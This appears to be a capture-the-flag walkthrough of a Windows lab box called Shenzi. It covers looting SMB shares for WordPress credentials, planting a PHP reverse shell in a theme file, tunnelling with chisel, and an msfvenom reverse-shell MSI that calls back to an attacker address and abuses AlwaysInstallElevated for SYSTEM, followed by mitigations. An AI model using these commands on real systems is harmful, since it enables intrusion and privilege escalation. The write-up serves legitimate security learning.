## Introduction

In this walkthrough, I encountered a WordPress site and gained access using credentials discovered in SMB shares. Once authenticated, I edited the `index.php` file of the active theme to include a PHP reverse shell and triggered it by visiting the page in the browser. This gave me a foothold on the machine as a low-privileged user. During post-exploitation enumeration, I discovered that the `AlwaysInstallElevated` registry keys were enabled, which allowed me to execute a malicious `.msi` installer file with elevated privileges. This ultimately resulted in a shell as `NT AUTHORITY\SYSTEM`.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

Run long gobuster scan

## Services

### Port 21

Anonymous login is not allowed.

### Port 135

```bash
rpcclient -U'%' $IP
```

**NT_STATUS_ACCESS_DENIED**

### Port 139/445

```bash
smbclient -L //$IP/ -N
```

```bash
smbclient //$IP/Shenzi -N
- RECURSE ON
- PROMPT OFF
- mget *
```

### Port 3306

```bash
mysql -u shenzi --ssl=0 -p -h $IP
```

We are not allowed to connect.

## Web

### Port 80

```bash
**feroxbuster -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -C 403,404,400**
```

```bash
gobuster dir -u http://$IP:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -b 400,403,404
```

## Exploitation

Reading files obtaine from Share I found WordPress credentials:

![image.png](image%207.png)

We should `Wordpress` endpoint, I have tried gobuster and feroxbuster but couldnâ€™t locate it. As the name of the box is `Shenzi` and it is often seen in `phpinfo` page we can make a guess that directory name is `shenzi`:

And yes we find a `WordPress` site. Letâ€™s login to wordpress using credentials we obtained from share.

I am gonna edit the `inactive theme` and obtain `RCE`.

Go to `Theme Editor` and edit the `php` code and execute it accessing from browser.

I replaced `index.php` with reverse shell, now I am gonna access it from browser.

## Privilege Escalation

Checking privileges:

![image.png](image%2014.png)

I have decided to perform port forwarding of `MySQL` to find anything useful using [chisel](https://github.com/jpillora/chisel):

```bash
./chisel_1.10.1_linux_amd64 server --reverse --port 51234
.\chisel.exe client 10.10.14.23:51234 R:3306:127.0.0.1:3306
```

I checked every database but nothing useful found there:

![image.png](image%2015.png)

I prefer running `PowerUp.ps1` before `winPEASany.exe`:

![image.png](image%2016.png)

It found a registry vulnerability, that means all `.msi` files will be executed with high privileges. Letâ€™s make it sure that with the following commands:

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

![image.png](image%2017.png)

First letâ€™s generate a payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.226 lport=4444 -f msi -o reverse.msi
```

copy the generated file to the Windows machine and execute it:

```bash
msiexec /quiet /qn /i reverse.msi
```

## Credentials

```bash
admin:FeltHeadwallWight357
```

## Mitigation

- Disable the `AlwaysInstallElevated` policy by setting both `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` and `HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` to `0`.
- Restrict write access to WordPress theme files by securing the file permissions and using version control or deployment pipelines.
- Avoid storing credentials in unsecured SMB shares and enforce least privilege access control.
- Regularly audit registry configurations and apply Group Policy to disable insecure settings.
